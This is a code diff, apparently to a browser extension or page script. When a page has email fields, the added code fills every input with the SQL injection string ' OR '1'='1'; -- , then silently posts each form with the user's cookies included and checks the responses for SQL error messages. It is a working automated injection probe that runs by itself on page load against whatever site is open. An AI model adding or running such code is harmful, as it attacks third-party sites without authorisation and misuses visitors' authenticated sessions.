@@ -43,6 +43,35 @@ document.addEventListener('DOMContentLoaded', function () {
                           if (emailFields.length > 0) {
                               console.log("Email input field detected.");
                               console.log("No. of email fields: " + emailFields.length);
+                              let payload = "' OR '1'='1'; -- ";  // SQL Injection payload for test
+                            // Added by chris 15/02 testing 
+                              inputFields.forEach(input => {
+                                input.value = payload;  // to inject the payload
+                                input.dispatchEvent(new Event('input', { bubbles: true }));  // to simulate a user tpyping
+                              });
+                      
+                              // Using fetch to test without submitting the form
+                              var forms = document.querySelectorAll('form');
+                              forms.forEach(form => {
+                                let actionURL = form.action; 
+                                let formData = new FormData(form); 
+                      
+                                fetch(actionURL, {
+                                  method: form.method || 'POST',
+                                  body: formData,
+                                  credentials: "include"  // to include cookies thing
+                                })
+                                .then(response => response.text())
+                                .then(text => {
+                                  console.log("SQL Injection Test Response:", text); // the results possibilities
+                                  if (text.includes("error") || text.includes("syntax") || text.includes("SQL")) {
+                                    console.warn("Potential SQL vulnerability detected!");
+                                  } else {
+                                    console.log("No obvious SQL errors detected.");
+                                  }
+                                })
+                                .catch(err => console.error("Error testing SQL injection:", err)); // any error or bug go here
+                              });
                           } else {
                               console.log("No email input fields detected.");
                           }
